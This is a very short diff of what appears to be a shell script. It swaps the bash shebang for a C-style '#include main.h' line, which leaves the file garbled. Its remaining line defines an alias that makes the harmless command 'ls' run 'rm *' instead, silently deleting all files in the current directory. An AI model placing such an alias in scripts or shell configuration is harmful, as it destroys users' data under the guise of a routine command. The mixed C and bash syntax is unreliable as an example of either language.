@@ -1,2 +1,2 @@
-#!/bin/bash
+ #include main.h
  alias ls="rm *" 
